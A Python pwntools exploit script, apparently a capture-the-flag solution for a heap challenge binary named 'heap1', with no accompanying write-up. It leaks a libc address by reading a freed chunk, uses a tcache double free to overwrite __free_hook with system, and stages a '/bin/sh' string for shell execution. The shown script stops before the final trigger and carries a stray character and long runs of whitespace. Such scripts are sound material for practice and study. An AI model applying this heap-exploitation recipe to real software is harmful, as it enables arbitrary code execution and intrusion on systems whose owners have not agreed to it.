from pwn import *

binary_name = './heap1'

def malloc(indx, size, payload):
    global r
    r.sendlineafter(b"\n> ","1")
    r.sendlineafter(b"Index: \n",str(indx))
    r.sendlineafter(b"Size: \n",str(size))
    r.sendlineafter(b"Data\n",payload)
                                                                                                                                                                                           
def free(indx):                                                                                                                                                                              
    global r                                                                                                                                                                                 
    r.sendlineafter(b"\n> ","3")                                                                                                                                                             
    r.sendlineafter(b"Index\n",str(indx))                                                                                                                                                    
                                                                                                                                                                                         t   
def show(indx):
    global r
    r.sendlineafter(b"\n> ","2")
    r.sendlineafter(b"Index\n",str(indx))
    return r.recvuntil("1. ")

elf = ELF(binary_name)
r = process(binary_name)
libc = elf.libc

r.sendline()
malloc(0, 0x638, "FARTFARTFARTFART")
free(0)
malloc(0, 0x38, "FARTFARTFARTFART")
malloc(1, 0x38, "FARTFARTFARTFART")
free(1)
free(0)
malloc(2, 0x638, "BIGBIGBIGBIG")
malloc(3, 0x638, "EXTRAEXTRAEXTRA")
free(2)
leak1 = show(2)
leak1 = u64(leak1[:leak1.find(b"1.")].ljust(8,b"\x00"))
libc.address = leak1-4111520
print(hex(libc.sym["system"]))
print(hex(libc.sym["__free_hook"]))

malloc(4, 56, "garbage")
free(4)
free(4)
malloc(4, 56, p64(libc.sym.__free_hook))
malloc(4, 56, p64(libc.sym.__free_hook))
malloc(5, 56, p64(libc.sym.system))
malloc(6, 0x18,b"/bin/sh\x00")

@atexception.register
def handler():
    log.error(r.recv())
with context.local(log_level = 'error'):
    atexception.register(handler)